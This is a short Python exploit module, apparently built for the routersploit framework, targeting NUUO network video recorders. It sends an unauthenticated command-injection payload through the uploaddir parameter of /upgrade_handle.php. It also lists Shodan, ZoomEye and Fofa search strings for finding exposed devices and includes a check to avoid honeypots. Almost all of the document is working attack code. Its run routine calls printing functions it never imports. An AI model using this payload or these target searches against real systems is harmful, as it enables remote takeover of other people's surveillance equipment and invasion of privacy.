'''
Exploit Title: NUUO NVR Unauthenticated Remote Code Execution
Vendor Homepage: http://www.nuuo.com/
Software Link: http://www.nuuo.com/

zoomeye search: title:"NUUO Network Video Recorder Login" +after:"2021-05-06"
Shodan search: title:"NUUO Network Video Recorder Login"
Fofa search: title="NUUO Network Video Recorder Login"
'''


from routersploit.core.http.http_client import HTTPClient
from routersploit.core.exploit.option import OptIP, OptPort
from routersploit.core.exploit.utils import is_it_honeypot
from routersploit.core.exploit.printer import log


class Exploit(HTTPClient):
    __info__ = {'name': 'NUUO NVR Unauthenticated Remote Code Execution'}

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def execute(self, cmd: str) -> str:
        response = self.http_request(
            method='GET',
            path=f"/upgrade_handle.php?cmd=writeuploaddir&uploaddir=';{cmd};'"
        )
        if response:
            return response.text
        return ''

    def check(self) -> bool:
        response = self.http_request(method='GET', path="/upgrade_handle.php")
        if response and not is_it_honeypot(response) and response.status_code == 200:
            return True
        return False

    def run(self):
        if self.check():
            print_success("Target seams %s:%d is vulnerable", self.target, self.port)
        else:
            print_error("Exploit failed - target %s:%d seems to be not vulnerable", self.target, self.port)
